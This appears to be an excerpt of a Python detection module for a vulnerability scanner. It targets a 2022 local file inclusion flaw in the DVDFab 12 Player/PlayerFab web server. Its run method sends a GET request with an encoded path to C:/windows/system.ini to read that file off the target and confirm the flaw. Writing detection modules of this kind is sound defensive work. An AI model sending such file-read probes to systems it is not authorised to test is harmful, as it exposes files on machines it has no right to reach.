#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""DVDFab 12 Player/PlayerFab is susceptible to local file inclusion which allows a remote attacker to download a."""
...
class Module(Scanner, Http_client):
    __info__ = {
        'name': 'DVDFab 12 Player/PlayerFab - Local File Inclusion Detection',
        ...
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'dvdfab', 'lfi', 'lfr', 'tenable', 'vuln'],
        'agent': {
            'risk': 'active',
    ...
    def run(self):
        r = self.http_request(method="GET", path='/download/C%3a%2fwindows%2fsystem.ini', allow_redirects=False)
        ...
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="DVDFab 12 Player/PlayerFab - Local File Inclusion detected",
